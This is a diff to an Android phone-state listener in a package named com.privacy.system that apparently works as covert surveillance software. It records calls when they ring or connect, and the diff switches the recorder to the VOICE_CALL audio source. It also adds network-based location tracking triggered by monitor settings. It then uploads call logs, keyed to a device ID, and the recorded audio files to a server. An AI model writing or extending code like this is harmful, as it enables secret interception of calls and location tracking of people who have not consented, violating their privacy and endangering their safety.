@@ -4,6 +4,7 @@ import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
+import com.baidu.location.LocationClientOption;
 import com.google.gson.Gson;
 import com.privacy.system.base.C;
 import com.privacy.system.db.CallRecordDB;
@@ -19,7 +20,6 @@ import com.privacy.system.service.utilservice.ClientSocket;
 import com.privacy.system.util.HttpUtil;
 import com.privacy.system.util.Logger;
 import com.privacy.system.util.NetworkUtil;
-
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -28,7 +28,6 @@ import android.database.Cursor;
 import android.media.MediaRecorder;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
 /**
  * 通话状态监听
@@ -42,7 +41,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 	boolean iscall = false;
 	private MonitorDB monitorDB;
 	private ContactsDB contactsDB;
-	private boolean isMonitor = false, isAnonymous;
+	private boolean isMonitor = false, isAnonymous,isRecing;
 	private String longitude, latitude, soundPath = "";
 	private CallRecordDB callRecordDB;
 	private String fileName;
@@ -69,12 +68,14 @@ public class MyPhoneStateListener extends PhoneStateListener {
 
 			Contacts contacts = contactsDB.queryOnlyRow(Contacts.COL_PHONE+ " =? ", new String[] { incomingNumber });
 			if (contacts == null) {
-				isAnonymous = true;
+				if(!incomingNumber.equals(sp.getString(C.PHONE_NUM,""))){
+					isAnonymous = true;
+				}
 			}
 
 			switch (state) {
 			case TelephonyManager.CALL_STATE_RINGING:// 电话铃响
-				Log.d(TAG, "CALL_STATE_RINGING:电话铃响");
+				Logger.d(TAG, "CALL_STATE_RINGING:电话铃响");
 			case TelephonyManager.CALL_STATE_OFFHOOK:// 摘机(处于通话中)
 				try {
 					if (monitorDB != null) {
@@ -82,6 +83,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 							isMonitor = true;
 							recordCallComment();
 						}
+						
 						Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ? ",new String[] { incomingNumber });
 						if (monitor != null) {
 							String callMonitorStatus = monitor.getCallMonitorStatus();
@@ -92,13 +94,13 @@ public class MyPhoneStateListener extends PhoneStateListener {
 						}
 						
 						Monitor locationStatus2 = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ? ",new String[] {sp.getString(C.PHONE_NUM,"")});
-						
 						if (locationStatus2 != null) {
 							Logger.d("MyPhone","是否监控定位:" + locationStatus2.getLocationStatus()+ " 本机号码为:"+ sp.getString(C.PHONE_NUM, ""));
 							if ("1".equals(locationStatus2.getLocationStatus())) {
 								Logger.d("MyPhone", "正在定位...");
 								LocationMan locationMan = new LocationMan(context);
 								locationMan.setRunBack(new MyRunback());
+								locationMan.setLocationPro(LocationClientOption.NetWorkFirst);
 								locationMan.startLocaiton();
 							}
 						}
@@ -173,14 +175,13 @@ public class MyPhoneStateListener extends PhoneStateListener {
 										callRecords.add(lists);
 										String param = "key="+ ClientSocket.APP_REQ_KEY+ "&device_id="+ sp.getString(C.DEVICE_ID, "")+ "&call_list="+ new Gson().toJson(callRecords);
 										Logger.d("MyPhone", "正在上传通话记录");
-										String result = NetworkUtil.uploadCall(context,param,C.RequestMethod.uploadCallRecord);
-
-										if (!result.startsWith("FAIL")) {
+										boolean result = NetworkUtil.uploadCall(context,param,C.RequestMethod.uploadCallRecord);
+										if (result) {
 											Logger.d("MyPhone", "上传通话记录成功");
-											String uploadFileResult = NetworkUtil.uploadFile(context,callRecord.getSoundRecordPath(),callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
-											if (uploadFileResult.contains("FAIL")) {
+											boolean uploadFileResult = NetworkUtil.uploadFile(context,callRecord.getSoundRecordPath(),callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
+											if (!uploadFileResult) {
 												Logger.d("Myphone","上传录音文件失败");
-												callRecordDB.update(CallRecord.COL_UPLOAD_RESULT+ " = ? "+ " , "+ CallRecord.COL_FILE_NAME+ " = ? ",CallRecord.COL_CALL_START_TIME+ " = ?",new String[] {"0",result,date });
+												callRecordDB.update(CallRecord.COL_UPLOAD_RESULT+ " = ? "+ " , "+ CallRecord.COL_FILE_NAME+ " = ? ",CallRecord.COL_CALL_START_TIME+ " = ?",new String[] {"0",fileName,date });
 											} else {
 												Logger.d("Myphone","上传录音文件成功");
 												callRecordDB.delete(CallRecord.COL_CALL_START_TIME+ " = ? ",new String[] { callRecord.getCallStartTime() });
@@ -213,7 +214,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 			mediaRecorder = new MediaRecorder();
 			// audioRecord.
 			// 設置聲音源(麥克風)
-			mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+			mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
 			// recordFile = File.createTempFile("record_",".amr",audioFile);
 			mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 			// Log.d(TAG, "文件路径:"+recordFile.getAbsolutePath());
@@ -227,11 +228,14 @@ public class MyPhoneStateListener extends PhoneStateListener {
 			mediaRecorder.setOnErrorListener(null);
 			mediaRecorder.setOnInfoListener(null);
 			mediaRecorder.prepare();
+			isRecing = false;
 			// mediaRecorder.start();
 		} else {
-			mediaRecorder.start();
+			if(!isRecing){
+				mediaRecorder.start();
+				isRecing = true;
+			}
 		}
-
 	}
 
 	public void stopRecord() {
